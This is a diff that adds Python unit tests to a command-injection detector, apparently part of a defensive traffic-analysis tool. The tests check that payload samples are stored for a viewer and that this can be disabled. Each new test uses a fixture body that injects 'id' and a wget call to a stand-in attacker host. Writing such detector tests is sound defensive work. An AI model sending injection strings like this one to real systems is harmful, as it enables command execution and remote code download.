@@ -226,3 +226,26 @@ def test_command_injection_scans_uri_in_binary_request():
     findings = CommandInjectionDetector().run(state, Config())
     assert len(findings) == 1
     assert findings[0].evidence["uri"].startswith("/shell.php")
+
+
+def test_payload_sample_is_kept_for_viewer():
+    """Вкладка «Код инжекта» берёт тело из payload_samples."""
+    from paradox.payload_excerpt import decode_sample
+
+    body = b"cmd=id;wget http://evil.example/x"
+    state = _state(("10.0.1.50", "/api", body))
+    findings = CommandInjectionDetector().run(state, Config())
+
+    samples = findings[0].evidence["payload_samples"]
+    assert len(samples) == 1
+    assert decode_sample(samples[0]) == body
+
+
+def test_payload_sample_can_be_disabled():
+    body = b"cmd=id;wget http://evil.example/x"
+    state = _state(("10.0.1.50", "/api", body))
+    findings = CommandInjectionDetector().run(
+        state, Config(payload_excerpt_enabled=False),
+    )
+
+    assert "payload_samples" not in findings[0].evidence
